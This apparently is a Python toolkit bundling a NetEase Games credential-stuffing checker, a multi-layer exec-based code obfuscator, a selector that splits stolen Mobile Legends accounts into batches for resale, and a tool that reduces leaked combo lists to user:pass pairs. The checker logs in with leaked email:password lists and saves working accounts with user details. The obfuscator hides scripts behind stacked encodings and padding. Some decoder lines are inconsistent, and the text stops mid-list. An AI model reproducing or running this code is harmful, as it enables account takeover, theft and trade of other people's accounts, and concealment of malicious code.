                with open("responses.txt", "a", encoding="utf-8") as f:
                    f.write(f"\n{email}:{password}\n")
                    f.write(json.dumps(response, indent=2))
                    f.write("\n" + "="*50 + "\n")

            if response.get("code") == 1006 and response.get("msg") == "Incorrect account or password.":
                print(f"{Fore.RED}[INVALID] {email}:{password} - Invalid password{Style.RESET_ALL}")
                with self.counter_lock:
                    self.invalid_pass += 1
                self.save_results("invalid", f"{email}:{password}", "Invalid password")
                return
                    
            if "Account does not exist" in r.text:
                print(f"{Fore.RED}[FAIL] {email}:{password} - Account does not exist{Style.RESET_ALL}")
                with self.counter_lock:
                    self.failed += 1
                self.save_results("failed", f"{email}:{password}", "Account does not exist")
                return
                
            if response.get("code") == 0:
                info_url = "https://account.neteasegames.com/ucenter/user/info?lang=en_US"
                info_headers = {"User-Agent": random_ua}
                
                r = self.session.get(info_url, headers=info_headers, timeout=10)
                info = r.json()
                
                user_id = info["user"]["user_id"]
                name = info["user"]["account_name"] 
                location = info["user"]["location"]
                
                print(f"{Fore.GREEN}[SUCCESS] {email}:{password} | ID:{user_id} | Name:{name} | Location:{location}{Style.RESET_ALL}")
                with self.counter_lock:
                    self.success += 1
                self.save_results("success", f"{email}:{password}", f"ID:{user_id} | Name:{name} | Location:{location}")
            else:
                error_msg = response.get("message", "Unknown error")
                print(f"{Fore.RED}[FAIL] {email}:{password} - {error_msg}{Style.RESET_ALL}")
                with self.counter_lock:
                    self.failed += 1
                self.save_results("failed", f"{email}:{password}", error_msg)
                
        except Exception as e:
            print(f"{Fore.RED}[ERROR] Error checking {email}:{password} - {str(e)}{Style.RESET_ALL}")
            with self.counter_lock:
                self.errors += 1
            self.save_results("errors", f"{email}:{password}", str(e))

    def print_results(self):
        total = self.success + self.failed + self.invalid_pass + self.errors
        print(f"""
{Fore.CYAN}Results Summary:
Total Checked: {total}
Success: {Fore.GREEN}{self.success}{Fore.CYAN}
Failed: {Fore.RED}{self.failed}{Fore.CYAN}
Invalid Pass: {Fore.YELLOW}{self.invalid_pass}{Fore.CYAN}
Errors: {Fore.RED}{self.errors}{Fore.CYAN}
{Style.RESET_ALL}
Results saved to:
- success.txt
- failed.txt
- invalid.txt 
- errors.txt
- responses.txt
""")
            
    def start(self):
        print(self.banner)
        filename = input(f"{Fore.YELLOW}Enter accounts file name: {Style.RESET_ALL}")
        
        try:
            with open(filename) as f:
                accounts = f.read().splitlines()
        except:
            print(f"{Fore.RED}[ERROR] File not found!{Style.RESET_ALL}")
            sys.exit()
            
        print(f"\n{Fore.CYAN}Loaded {len(accounts)} accounts{Style.RESET_ALL}\n")
        
        with ThreadPoolExecutor(max_workers=10) as executor:
            executor.map(self.check_account, accounts)
            
        self.print_results()
        
def banner():
    clear()
    print(f'''   {k}                                      
         .+#-                                           
         .+@@%-                                         
           .*@@%-   {cn}          ..     {k}                   
             .*@@%- {cn}         .@@# {k}                      
               .*@@%- {cn}       +@@-    {k}                   
               :#@@@@%-{cn}      @@#     -@@=               
             :#@@*.{k}.+@@%-{cn}   =@@:      =@@@=             
           :#@@*. {k}   .+@@#:{cn}  -+         =@@@=           
         :#@@*.   {k}     .+@@%-   {cn}          =@@@=         
        +@@@-     {k}       .#@@#:   {cn}          %@@%.       
         :#@@*.          {k} #@@@@%-        {cn} =@@@=         
        {cn}   -#@@*.        -@@+.{k}*@@#:    {cn} =@@@=           
        {cn}     :#@@#:      %@@  {k} .+@@%- {cn} :#%=             
               :#@*  {cn}   -@@=    {k} .*@@%-                 
                     {cn}   %@%     {k}   .+@@%-               
                     {cn}  -@@-        {k}  .*@@%-             
                         .        {k}     .+@@%-           
                                   {k}      .*@@%-         
                                   {k}        .+*:
    {gn}Python Obfuscate | TG: @Kenshirupogi                            
                                   ''')

def menu():
    print (f'''{k}
{rd}[{yw}1{rd}] {gn}Encode Marshal
{rd}[{yw}2{rd}] {gn}Encode Zlib
{rd}[{yw}3{rd}] {gn}Encode Base16
{rd}[{yw}4{rd}] {gn}Encode Base32
{rd}[{yw}5{rd}] {gn}Encode Base64
{rd}[{yw}6{rd}] {gn}Encode Lzma
{rd}[{yw}7{rd}] {gn}Encode Gzip
{rd}[{yw}8{rd}] {gn}Encode Zlib,Base16
{rd}[{yw}9{rd}] {gn}Encode Zlib,Base32
{rd}[{yw}10{rd}] {gn}Encode Zlib,Base64
{rd}[{yw}11{rd}] {gn}Encode Gzip,Base16
{rd}[{yw}12{rd}] {gn}Encode Gzip,Base32
{rd}[{yw}13{rd}] {gn}Encode Gzip,Base64
{rd}[{yw}14{rd}] {gn}Encode Lzma,Base16
{rd}[{yw}15{rd}] {gn}Encode Lzma,Base32
{rd}[{yw}16{rd}] {gn}Encode Lzma,Base64
{rd}[{yw}17{rd}] {gn}Encode Marshal,Zlib
{rd}[{yw}18{rd}] {gn}Encode Marshal,Gzip
{rd}[{yw}19{rd}] {gn}Encode Marshal,Lzma
{rd}[{yw}20{rd}] {gn}Encode Marshal,Base16
{rd}[{yw}21{rd}] {gn}Encode Marshal,Base32
{rd}[{yw}22{rd}] {gn}Encode Marshal,Base64
{rd}[{yw}23{rd}] {gn}Encode Marshal,Zlib,B16
{rd}[{yw}24{rd}] {gn}Encode Marshal,Zlib,B32
{rd}[{yw}25{rd}] {gn}Encode Marshal,Zlib,B64
{rd}[{yw}26{rd}] {gn}Encode Marshal,Lzma,B16
{rd}[{yw}27{rd}] {gn}Encode Marshal,Lzma,B32
{rd}[{yw}28{rd}] {gn}Encode Marshal,Lzma,B64
{rd}[{yw}29{rd}] {gn}Encode Marshal,Gzip,B16
{rd}[{yw}30{rd}] {gn}Encode Marshal,Gzip,B32
{rd}[{yw}31{rd}] {gn}Encode Marshal,Gzip,B64
{rd}[{yw}32{rd}] {gn}Encode Marshal,Zlib,Lzma,B16
{rd}[{yw}33{rd}] {gn}Encode Marshal,Zlib,Lzma,B32
{rd}[{yw}34{rd}] {gn}Encode Marshal,Zlib,Lzma,B64
{rd}[{yw}35{rd}] {gn}Encode Marshal,Zlib,Gzip,B16
{rd}[{yw}36{rd}] {gn}Encode Marshal,Zlib,Gzip,B32
{rd}[{yw}37{rd}] {gn}Encode Marshal,Zlib,Gzip,B64
{rd}[{yw}38{rd}] {gn}Encode Marshal,Zlib,Lzma,Gzip,B16
{rd}[{yw}39{rd}] {gn}Encode Marshal,Zlib,Lzma,Gzip,B32
{rd}[{yw}40{rd}] {gn}Encode Marshal,Zlib,Lzma,Gzip,B64
{rd}[{yw}41{rd}] {gn}Simple Encode
{rd}[{yw}42{rd}] {gn}Exit

    ''')
    print ('')
class FileSize:
    def datas(self,z):
        for x in ['Byte','KB','MB','GB']:
            if z < 1024.0:
                return "%3.1f %s" % (z,x)
            z /= 1024.0
    def __init__(self,path):
        if os.path.isfile(path):
            dts = os.stat(path).st_size
            print(f"{tr} Encoded File Size : %s\n" % self.datas(dts))

def Encode(option,data,output):
    loop = int(eval(_input % f"{tr} Encode Count : "))
    if option == 1:
        xx = "mar(data.encode('utf8'))[::-1]"
        heading = "# Encoded By @MrEsfelurm | https://github/Mr-Spect3r\n\n_ = lambda __ : __import__('marshal').loads(__[::-1]);"
    elif option == 2:
        xx = "zlb(data.encode('utf8'))[::-1]"
        heading = "# Encoded By @MrEsfelurm | https://github/Mr-Spect3r\n\n_ = lambda __ : __import__('zlib').decompress(__[::-1]);"
    elif option == 3:
        xx = "b16(data.encode('utf8'))[::-1]"
        heading = "# Encoded By @MrEsfelurm | https://github/Mr-Spect3r\n\n_ = lambda __ : __import__('base64').b16decode(__[::-1]);"
    elif option == 4:
        xx = "b32(data.encode('utf8'))[::-1]"
        heading = "# Encoded By @MrEsfelurm | https://github/Mr-Spect3r\n\n_ = lambda __ : __import__('base64').b32decode(__[::-1]);"
    elif option == 5:
        xx = "b64(data.encode('utf8'))[::-1]"
        heading = "# Encoded By @MrEsfelurm | https://github/Mr-Spect3r\n\n_ = lambda __ : __import__('base64').b64decode(__[::-1]);"
    elif option == 6:
        xx = "lzm(data.encode('utf8')[::-1]"
        heading = "# Encoded By @MrEsfelurm | https://github/Mr-Spect3r\n\n_ = lambda __ : __import__('lzma').decompress(__[::-1]);"
    elif option == 7:
        xx = "gzi(data.encode('utf8')[::-1]"
        heading = "# Encoded By @MrEsfelurm | https://github/Mr-Spect3r\n\n_ = lambda __ : __import__('gzip').decompress(__[::-1]);"
    elif option == 8:
        xx = "b16(zlb(data.encode('utf8')))[::-1]"
        heading = "# Encoded By @MrEsfelurm | https://github/Mr-Spect3r\n\n_ = lambda __ : __import__('zlib').decompress(__import__('base64').b16decode(__[::-1]));"
    elif option == 9:
        xx = "b32(zlb(data.encode('utf8')))[::-1]"
        heading = "# Encoded By @MrEsfelurm | https://github/Mr-Spect3r\n\n_ = lambda __ : __import__('zlib').decompress(__import__('base64').b32decode(__[::-1]));"
    elif option == 10:
        xx = "b64(zlb(data.encode('utf8')))[::-1]"
        heading = "# Encoded By @MrEsfelurm | https://github/Mr-Spect3r\n\n_ = lambda __ : __import__('zlib').decompress(__import__('base64').b64decode(__[::-1]));"
    elif option == 11:
        xx = "b16(gzi(data.encode('utf8')))[::-1]"
        heading = "# Encoded By @MrEsfelurm | https://github/Mr-Spect3r\n\n_ = lambda __ : __import__('gzip').decompress(__import__('base64').b16decode(__[::-1]));"
    elif option == 12:
        xx = "b32(gzi(data.encode('utf8')))[::-1]"
        heading = "# Encoded By @MrEsfelurm | https://github/Mr-Spect3r\n\n_ = lambda __ : __import__('gzip').decompress(__import__('base64').b16decode(__[::-1]));"
    elif option == 13:
        xx = "b64(gzi(data.encode('utf8')))[::-1]"
        heading = "# Encoded By @MrEsfelurm | https://github/Mr-Spect3r\n\n_ = lambda __ : __import__('gzip').decompress(__import__('base64').b16decode(__[::-1]));"
    elif option == 14:
        xx = "b16(lzm(data.encode('utf8')))[::-1]"
        heading = "# Encoded By @MrEsfelurm | https://github/Mr-Spect3r\n\n_ = lambda __ : __import__('lzma').decompress(__import__('base64').b16decode(__[::-1]));"
    elif option == 15:
        xx = "b32(lzm(data.encode('utf8')))[::-1]"
        heading = "# Encoded By @MrEsfelurm | https://github/Mr-Spect3r\n\n_ = lambda __ : __import__('lzma').decompress(__import__('base64').b16decode(__[::-1]));"
    elif option == 16:
        xx = "b64(lzm(data.encode('utf8')))[::-1]"
        heading = "# Encoded By @MrEsfelurm | https://github/Mr-Spect3r\n\n_ = lambda __ : __import__('lzma').decompress(__import__('base64').b16decode(__[::-1]));"
    elif option == 17:
        xx = "zlb(mar(data.encode('utf8')))[::-1]"
        heading = "# Encoded By @MrEsfelurm | https://github/Mr-Spect3r\n\n_ = lambda __ : __import__('marshal').loads(__import__('zlib').decompress(__[::-1]));"
    elif option == 18:
        xx = "gzi(mar(data.encode('utf8')))[::-1]"
        heading = "# Encoded By @MrEsfelurm | https://github/Mr-Spect3r\n\n_ = lambda __ : __import__('marshal').loads(__import__('gzip').decompress(__[::-1]));"
    elif option == 19:
        xx = "lzm(mar(data.encode('utf8')))[::-1]"
        heading = "# Encoded By @MrEsfelurm | https://github/Mr-Spect3r\n\n_ = lambda __ : __import__('marshal').loads(__import__('lzma').decompress(__[::-1]));"
    elif option == 20:
        xx = "b16(mar(data.encode('utf8')))[::-1]"
        heading = "# Encoded By @MrEsfelurm | https://github/Mr-Spect3r\n\n_ = lambda __ : __import__('marshal').loads(__import__('base64').b16decode(__[::-1]));"
    elif option == 21:
        xx = "b32(mar(data.encode('utf8')))[::-1]"
        heading = "# Encoded By @MrEsfelurm | https://github/Mr-Spect3r\n\n_ = lambda __ : __import__('marshal').loads(__import__('base64').b32decode(__[::-1]));"
    elif option == 22:
        xx = "b64(mar(data.encode('utf8')))[::-1]"
        heading = "# Encoded By @MrEsfelurm | https://github/Mr-Spect3r\n\n_ = lambda __ : __import__('marshal').loads(__import__('base64').b64decode(__[::-1]));"
    elif option == 23:
        xx = "b16(zlb(mar(data.encode('utf8'))))[::-1]"
        heading = "# Encoded By @MrEsfelurm | https://github/Mr-Spect3r\n\n_ = lambda __ : __import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b16decode(__[::-1])));"
    elif option == 24:
        xx = "b32(zlb(mar(data.encode('utf8'))))[::-1]"
        heading = "# Encoded By @MrEsfelurm | https://github/Mr-Spect3r\n\n_ = lambda __ : __import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b32decode(__[::-1])));"
    elif option == 25:
        xx = "b64(zlb(mar(data.encode('utf8'))))[::-1]"
        heading = "# Encoded By @MrEsfelurm | https://github/Mr-Spect3r\n\n_ = lambda __ : __import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b64decode(__[::-1])));"
    elif option == 26:
        xx = "b16(lzm(mar(data.encode('utf8'))))[::-1]"
        heading = "# Encoded By @MrEsfelurm | https://github/Mr-Spect3r\n\n_ = lambda __ : __import__('marshal').loads(__import__('lzma').decompress(__import__('base64').b16decode(__[::-1])));"
    elif option == 27:
        xx = "b32(lzm(mar(data.encode('utf8'))))[::-1]"
        heading = "# Encoded By @MrEsfelurm | https://github/Mr-Spect3r\n\n_ = lambda __ : __import__('marshal').loads(__import__('lzma').decompress(__import__('base64').b32decode(__[::-1])));"
    elif option == 28:
        xx = "b64(lzm(mar(data.encode('utf8'))))[::-1]"
        heading = "# Encoded By @MrEsfelurm | https://github/Mr-Spect3r\n\n_ = lambda __ : __import__('marshal').loads(__import__('lzma').decompress(__import__('base64').b64decode(__[::-1])));"
    elif option == 29:
        xx = "b16(gzi(mar(data.encode('utf8'))))[::-1]"
        heading = "# Encoded By @MrEsfelurm | https://github/Mr-Spect3r\n\n_ = lambda __ : __import__('marshal').loads(__import__('gzip').decompress(__import__('base64').b16decode(__[::-1])));"
    elif option == 30:
        xx = "b32(gzi(mar(data.encode('utf8'))))[::-1]"
        heading = "# Encoded By @MrEsfelurm | https://github/Mr-Spect3r\n\n_ = lambda __ : __import__('marshal').loads(__import__('gzip').decompress(__import__('base64').b32decode(__[::-1])));"
    elif option == 31:
        xx = "b64(gzi(mar(data.encode('utf8'))))[::-1]"
        heading = "# Encoded By @MrEsfelurm | https://github/Mr-Spect3r\n\n_ = lambda __ : __import__('marshal').loads(__import__('gzip').decompress(__import__('base64').b64decode(__[::-1])));"
    elif option == 32:
        xx = "b16(zlb(lzm(mar(data.encode('utf8')))))[::-1]"
        heading = "# Encoded By @MrEsfelurm | https://github/Mr-Spect3r\n\n_ = lambda __ : __import__('marshal').loads(__import__('lzma').decompress(__import__('zlib').decompress(__import__('base64').b16decode(__[::-1]))));"
    elif option == 33:
        xx = "b32(zlb(lzm(mar(data.encode('utf8')))))[::-1]"
        heading = "# Encoded By @MrEsfelurm | https://github/Mr-Spect3r\n\n_ = lambda __ : __import__('marshal').loads(__import__('lzma').decompress(__import__('zlib').decompress(__import__('base64').b32decode(__[::-1]))));"
    elif option == 34:
        xx = "b64(zlb(lzm(mar(data.encode('utf8')))))[::-1]"
        heading = "# Encoded By @Xairuu1 \n\n_ = lambda __ : __import__('marshal').loads(__import__('lzma').decompress(__import__('zlib').decompress(__import__('base64').b64decode(__[::-1]))));"
    elif option == 35:
        xx = "b16(zlb(gzi(mar(data.encode('utf8')))))[::-1]"
        heading = "# Encoded By @Xairuu1 \n\n_ = lambda __ : __import__('marshal').loads(__import__('gzip').decompress(__import__('zlib').decompress(__import__('base64').b16decode(__[::-1]))));"
    elif option == 36:
        xx = "b32(zlb(gzi(mar(data.encode('utf8')))))[::-1]"
        heading = "# Encoded By @Xairuu1 \n\n_ = lambda __ : __import__('marshal').loads(__import__('gzip').decompress(__import__('zlib').decompress(__import__('base64').b32decode(__[::-1]))));"
    elif option == 37:
        xx = "b64(zlb(gzip(mar(data.encode('utf8')))))[::-1]"
        heading = "# Encoded By @Xairuu1 \n\n_ = lambda __ : __import__('marshal').loads(__import__('gzip').decompress(__import__('zlib').decompress(__import__('base64').b64decode(__[::-1]))));"
    elif option == 38:
        xx = "b16(zlb(lzm(gzi(mar(data.encode('utf8'))))))[::-1]"
        heading = "# Encoded By @Xairuu1 \n\n_ = lambda __ : __import__('marshal').loads(__import__('gzip').decompress(__import__('lzma').decompress(__import__('zlib').decompress(__import__('base64').b64decode(__[::-1])))));"
    elif option == 39:
        xx = "b32(zlb(lzm(gzi(mar(data.encode('utf8'))))))[::-1]"
        heading = "# Encoded By @Xairuu1 \n\n_ = lambda __ : __import__('marshal').loads(__import__('gzip').decompress(__import__('lzma').decompress(__import__('zlib').decompress(__import__('base64').b64decode(__[::-1])))));"
    elif option == 40:
        xx = "b64(zlb(lzm(gzi(mar(data.encode('utf8'))))))[::-1]"
        heading = "# Encoded By @Xairuu1 \n\n_ = lambda __ : __import__('marshal').loads(__import__('gzip').decompress(__import__('lzma').decompress(__import__('zlib').decompress(__import__('base64').b64decode(__[::-1])))));"
    else:
        sys.exit("\n Invalid Option!")
    
    for x in range(loop):
        try:
            data = "exec((_)(%s))" % repr(eval(xx))
        except TypeError as s:
            sys.exit(f"{fls} TypeError : " + str(s))
    with open(output, 'w') as f:
        f.write(heading + data)
        f.close()

def SEncode(data,output):
    for x in range(5):
        method = repr(b64(zlb(lzm(gzi(mar(data.encode('utf8'))))))[::-1])
        data = "exec(__import__('marshal').loads(__import__('gzip').decompress(__import__('lzma').decompress(__import__('zlib').decompress(__import__('base64').b64decode(%s[::-1]))))))" % method
    z = []
    for i in data:
        z.append(ord(i))
    sata = "_ = %s\nexec(''.join(chr(__) for __ in _))" % z
    with open(output, 'w') as f:
        f.write("exec(str(chr(35)%s));" % '+chr(1)'*10000)
        f.write(sata)
        f.close()
    py_compile.compile(output,output)


def MainMenu():
    try:
        clear()
        banner()
        menu()
        try:
            option = int(eval(_input % f"{tr} Option:{cn} "))
        except ValueError:
            sys.exit(f"\n{fls} Invalid Option !")
        
        if option > 0 and option <= 42:
            if option == 42:
                sys.exit(f"{tr} Thanks For Using this Tool")
            clear()
            banner()
        else:
            sys.exit(f'\n{fls} Invalid Option !')
        try:
            file = eval(_input % f"{tr} File Name : ")
            data = open(file).read()
        except IOError:
            sys.exit(f"\n{fls} File Not Found!")
        
        output = file.lower().replace('.py', '') + '_enc.py'
        if option == 41:
            SEncode(data,output)
        else:
            Encode(option,data,output)
        print(f"\n{tr} Successfully Encrypted %s" % file)
        print(f"\n{tr} saved as %s" % output)
        FileSize(output)
    except KeyboardInterrupt:
        time.sleep(1)
        sys.exit()
        
def run_obfuscator():
    MainMenu()
    
EXPIRATION_DATE = dt(2030, 5, 5)
COLLECTOR_TIERS = [
    "Seasoned Collector",
    "Expert Collector",
    "Renowned Collector",
    "Exalted Collector",
    "Mega Collector",
    "World Collector",
]

def check_expiration():
    if dt.now() > EXPIRATION_DATE:
        console.print("[bold red]⚠ This script has expired! Contact @Happynissss for updates.[/bold red]")
        time.sleep(3)
        exit()

def clear_screen():
    os.system("cls" if os.name == "nt" else "clear")

def print_banner():
    check_expiration()
    skull = r"""
       ______
    .-        -.
   /            \
  |,  .-.  .-.  ,|
  | )(_o/  \o_)( |
  |/     /\     \|
  (_     ^^     _)
   \__|IIIIII|__/
    | \IIIIII/ |
    \          /
     `--------`
    """
    colors = ["red", "yellow", "green", "cyan", "blue", "magenta"]
    rainbow_lines = []
    for i, line in enumerate(skull.splitlines()):
        color = colors[i % len(colors)]
        rainbow_lines.append(f"[{color}]{line}[/{color}]")
    console.print("\n".join(rainbow_lines))
    console.print(Panel.fit(
        "[bold yellow]ML ACCOUNT SELECTOR[/bold yellow]\n"
        "[cyan]Created by: @Happynissss[/cyan]\n"
        "[magenta]TG Channel: https://t.me/+AUgnua9oJuIzMjA1[/magenta]\n"
        f"[green]Valid until: {EXPIRATION_DATE.strftime('%Y-%m-%d')}[/green]",
        box=box.DOUBLE_EDGE,
        style="bold cyan"
    ))

def extract_accounts_v2(lines):
    accounts = []
    current = {}
    for line in lines:
        line = line.strip()
        if not line:
            if current:
                accounts.append(current)
                current = {}
            continue
        if ":" in line:
            key, val = line.split(":", 1)
            current[key.strip()] = val.strip()
    if current:
        accounts.append(current)
    return accounts

def parse_skin_count(account):
    try:
        for key in account:
            if "skin" in key.lower():
                return int(account[key].split()[0])
        return 0
    except:
        return 0

def parse_collector_tier(account):
    raw_tier = account.get("Collector Tier", "").strip().lower()
    for tier in COLLECTOR_TIERS:
        if tier.lower() in raw_tier:
            return tier
    return "Unranked"

def parse_v2l(account):
    for key in account:
        if "v2l" in key.lower():
            val = account[key].strip().lower()
            if "yes" in val:
                return "Yes"
            elif "no" in val:
                return "No"
    return "Unknown"

def group_accounts_by_skins(accounts):
    groups = defaultdict(list)
    for acc in accounts:
        skins = parse_skin_count(acc)
        if skins <= 100:
            group = "100 Below"
        elif skins <= 200:
            group = "101-200"
        elif skins <= 300:
            group = "201-300"
        elif skins <= 400:
            group = "301-400"
        elif skins <= 500:
            group = "401-500"
        elif skins <= 600:
            group = "501-600"
        elif skins <= 700:
            group = "601-700"
        elif skins <= 800:
            group = "701-800"
        else:
            group = "801 Above"
        groups[group].append(acc)
    return groups

def group_accounts_by_collector_tier(accounts):
    groups = defaultdict(list)
    for acc in accounts:
        tier = parse_collector_tier(acc)
        groups[tier].append(acc)
    return groups

def group_accounts_by_v2l(accounts):
    groups = defaultdict(list)
    for acc in accounts:
        v2l = parse_v2l(acc)
        groups[v2l].append(acc)
    return groups

def select_random_accounts(groups, num_accounts):
    total_accounts = sum(len(accounts) for accounts in groups.values())
    if num_accounts > total_accounts:
        num_accounts = total_accounts
    group_quota = {}
    for group, accounts in groups.items():
        ratio = len(accounts) / total_accounts
        group_quota[group] = int(ratio * num_accounts)
    assigned = sum(group_quota.values())
    leftover = num_accounts - assigned
    remainders = sorted(
        ((group, (len(groups[group]) / total_accounts) * num_accounts - group_quota[group])
         for group in groups),
        key=lambda x: x[1],
        reverse=True
    )
    for group, _ in remainders:
        if leftover <= 0:
            break
        if group_quota[group] < len(groups[group]):
            group_quota[group] += 1
            leftover -= 1
    selected = []
    for group, quota in group_quota.items():
        if groups[group]:
            random.shuffle(groups[group])
            selected.extend(groups[group][:quota])
            groups[group] = groups[group][quota:]
    return selected

def display_distribution(groups, total_accounts, title="📊 DISTRIBUTION"):
    console.print(f"\n[bold magenta]{title}[/bold magenta]")
    bar_length = 40
    for group in sorted(groups.keys()):
        count = len(groups[group])
        perc = (count / total_accounts) * 100 if total_accounts > 0 else 0
        filled = int(perc / 100 * bar_length)
        bar = "[green]" + "█" * filled + "[white]" + "░" * (bar_length - filled)
        console.print(f"[yellow]{group:>16}[/yellow] | {count:>3} | {bar} {perc:.1f}%")

def display_collector_distribution(groups, total_accounts):
    console.print(f"\n[bold cyan]📊 COLLECTOR TIER DISTRIBUTION[/bold cyan]")
    bar_length = 40
    for tier in COLLECTOR_TIERS + ["Unranked"]:
        count = len(groups.get(tier, []))
        perc = (count / total_accounts) * 100 if total_accounts > 0 else 0
        filled = int(perc / 100 * bar_length)
        bar = "[green]" + "█" * filled + "[white]" + "░" * (bar_length - filled)
        console.print(f"[yellow]{tier:>16}[/yellow] | {count:>3} | {bar} {perc:.1f}%")

def display_v2l_distribution(groups, total_accounts):
    console.print(f"\n[bold green]📊 V2L STATUS DISTRIBUTION[/bold green]")
    bar_length = 40
    for v2l in ["Yes", "No", "Unknown"]:
        count = len(groups.get(v2l, []))
        perc = (count / total_accounts) * 100 if total_accounts > 0 else 0
        filled = int(perc / 100 * bar_length)
        bar = "[green]" + "█" * filled + "[white]" + "░" * (bar_length - filled)
        console.print(f"[yellow]{v2l:>16}[/yellow] | {count:>3} | {bar} {perc:.1f}%")

def display_account(account):
    table = Table(title=f"🎮 Account: {account.get('Name','Unknown')}", box=box.ROUNDED, expand=True)
    table.add_column("Category", style="magenta", justify="right")
    table.add_column("Value", style="green")
    for key, val in account.items():
        table.add_row(key, val)
    console.print(table)

def ml_selector_main():
    try:
        while True:
            clear_screen()
            print_banner()
            folder = "accounts"
            if not os.path.exists(folder):
                os.makedirs(folder)
            txt_files = [f for f in os.listdir(folder) if f.endswith(".txt")]
            if not txt_files:
                console.print("[red]✗ No .txt files found in 'accounts' folder![/red]")
                time.sleep(2)
                return
            console.print("\n[cyan]📂 Available .txt files in 'accounts':[/cyan]")
            for i, f in enumerate(txt_files, 1):
                console.print(f"[yellow]{i}. [green]{f}[/green]")
            try:
                choice = int(console.input("\n[bold green]Choose file number: [/bold green]"))
                if not (1 <= choice <= len(txt_files)):
                    raise ValueError
            except ValueError:
                console.print("[red]Invalid selection![/red]")
                time.sleep(2)
                continue
            file_path = os.path.join(folder, txt_files[choice - 1])
            with open(file_path, "r", encoding="utf-8") as f:
                lines = f.readlines()
            accounts = extract_accounts_v2(lines)
            valid_accounts = [a for a in accounts if parse_skin_count(a) > 0]
            if not valid_accounts:
                console.print("[red]✗ No valid accounts with skin info found![/red]")
                time.sleep(2)
                continue

            console.print("\n[bold cyan]Selection Mode:[/bold cyan]")
            console.print("[yellow]1.[/yellow] Skin Count Selector")
            console.print("[yellow]2.[/yellow] Collector Tier Selector")
            console.print("[yellow]3.[/yellow] V2L Status Selector")
            console.print("[yellow]4.[/yellow] Show All Distributions")

            mode = console.input("\n[bold green]Choose mode (1/2/3/4): [/bold green]")

            if mode == "1":
                groups = group_accounts_by_skins(valid_accounts)
                display_distribution(groups, len(valid_accounts), "📊 SKIN DISTRIBUTION")
            elif mode == "2":
                groups = group_accounts_by_collector_tier(valid_accounts)
                display_collector_distribution(groups, len(valid_accounts))
            elif mode == "3":
                groups = group_accounts_by_v2l(valid_accounts)
                display_v2l_distribution(groups, len(valid_accounts))
            elif mode == "4":
                groups_skin = group_accounts_by_skins(valid_accounts)
                groups_collector = group_accounts_by_collector_tier(valid_accounts)
                groups_v2l = group_accounts_by_v2l(valid_accounts)

                display_distribution(groups_skin, len(valid_accounts), "📊 SKIN DISTRIBUTION")
                display_collector_distribution(groups_collector, len(valid_accounts))
                display_v2l_distribution(groups_v2l, len(valid_accounts))

                groups = {"All": valid_accounts}
            else:
                console.print("[red]Invalid selection mode![/red]")
                time.sleep(2)
                continue

            num_to_select = int(console.input(f"\n[bold green]🛒 Number of accounts to select (1-{len(valid_accounts)}): [/bold green]"))
            selected = select_random_accounts(groups, num_to_select)
            selected.sort(key=lambda x: parse_skin_count(x), reverse=True)

            if not os.path.exists("Bandits"):
                os.makedirs("Bandits")
            output_file = os.path.join("Bandits", f"{len(selected)}accounts.txt")
            with open(output_file, "w", encoding="utf-8") as f:
                for acc in selected:
                    for k, v in acc.items():
                        f.write(f"{k}: {v}\n")
                    f.write("\n")

            remaining_accounts = [a for a in valid_accounts if a not in selected]
            with open(file_path, "w", encoding="utf-8") as f:
                for acc in remaining_accounts:
                    for k, v in acc.items():
                        f.write(f"{k}: {v}\n")
                    f.write("\n")

            clear_screen()
            console.print(Panel.fit(
                f"✅ [green]Selection complete! Saved {len(selected)} accounts to[/green] [yellow]{output_file}[/yellow]\n"
                f"✂ [red]{len(selected)} accounts removed from {file_path}[/red]",
                style="bold cyan"
            ))

            for acc in selected:
                display_account(acc)

            again = console.input("\n[bold green]🔄 Select more accounts? (y/n): [/bold green]").lower()
            if again != "y":
                break

    except KeyboardInterrupt:
        console.print("\n[bold cyan]🙏 Thanks for using ML Account Selector![/bold cyan]")
        
def display_banner():
    banner_text = Text("ALEX EDITION TOOL", style="bold blue")
    banner_panel = Panel(banner_text, title="ALEX EDITION TOOL", title_align="center", border_style="blue")
    console.print(banner_panel)

def txt_finder():
    console.print(Panel("𝗘𝗡𝗧𝗘𝗥 𝗞𝗘𝗬𝗪𝗢𝗥𝗗:", title="Text Finder", title_align="left", border_style="blue"))
    keyword = input()
    console.print(Panel("𝗘𝗡𝗧𝗘𝗥 𝗙𝗜𝗟𝗘 𝗡𝗔𝗠𝗘:", title="Text Finder", title_align="left", border_style="blue"))
    filename = input()

    if os.path.isfile(filename):
        console.print(f"Searching for '{keyword}' in '{filename}'...", style="yellow")

        output_file = f"Shampooo_Master_{keyword}.txt"
        
        matches = []
        with open(filename, 'r') as file:
            matches = [line for line in file if keyword.lower() in line.lower()]

        # Create a panel for the output
        if matches:
            table = Table(show_header=True, header_style="bold magenta")
            table.add_column("Line Number", style="cyan")
            table.add_column("Matched Line", style="white")

            for line_number, line in enumerate(matches, start=1):
                table.add_row(str(line_number), line.strip())

            panel = Panel(table, title=f"Results for '{keyword}'", border_style="green")
            console.print(panel)

            # Save results to the output file
            with open(output_file, 'w') as f:
                f.write(f"Results for '{keyword}'\n")
                f.write(f"Date: {datetime.now()}\n")
                f.write("\nMatched Lines:\n")
                for line in matches:
                    f.write(line)

            console.print(f"Matches found! Saved to: {output_file}", style="green")
        else:
            console.print(f"No matches found for '{keyword}'.", style="red")

        # Ask if the user wants to remove URLs
        remove_urls = input("Do you want to remove URLs and keep user:pass? (yes/no): ").strip().lower()
        if remove_urls == 'yes':
            remove_url_and_keep_user_pass(filename)
    else:
        console.print("Not found! Please enter correct filename.", style="red")

def remove_url_and_keep_user_pass(filepath):
    try:
        # Open the file and read the content
        with open(filepath, "r") as file:
            lines = file.readlines()

        # Open the file again for writing the modified content
        with open(filepath, "w") as file:
            for line in lines:
                # Use regex to remove everything before user:pass
                match = re.search(r'([^:]+:[^:]+)$', line.strip())
                if match:
                    file.write(match.group(1) + '\n')
        
        console.print(f"URLs removed successfully, keeping user:pass in: {filepath}", style="green")
    except Exception as e:
        console.print(f"Error processing file {filepath}: {e}", style="red")

def name_maker():
    console.print(Panel("Generating Random Username...", title="Username Generator", title_align="left", border_style="blue"))
    names = [
        "ShadowHunter", "NightWolf", "PhantomRider", "BlazeStorm",
        "SilentFury", "DarkViper", "IronGhost", "Frostbite",
        "VenomClaw", "ThunderStrike", "GagoKaba", "Tuberculosis",
        "Santokas", "Hamburger", "KupalKaba", "BossBossing",
